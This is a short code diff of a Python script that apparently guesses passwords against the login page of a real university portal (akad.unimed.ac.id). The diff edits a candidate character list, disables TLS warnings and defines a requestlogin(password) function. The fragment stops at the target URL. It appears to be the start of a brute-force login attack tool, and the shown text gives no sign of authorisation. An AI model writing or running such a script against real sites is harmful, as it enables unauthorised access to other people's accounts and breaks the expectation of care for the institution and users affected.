@@ -1,8 +1,10 @@
 import asyncio
 import requests
 import aiohttp
+import urllib3
 
-text = list("akuhebat1}!")
+text = list("akuhebat12!")
+urllib3.disable_warnings()
 
 def requestlogin(password):
     url = "https://akad.unimed.ac.id/index.php"
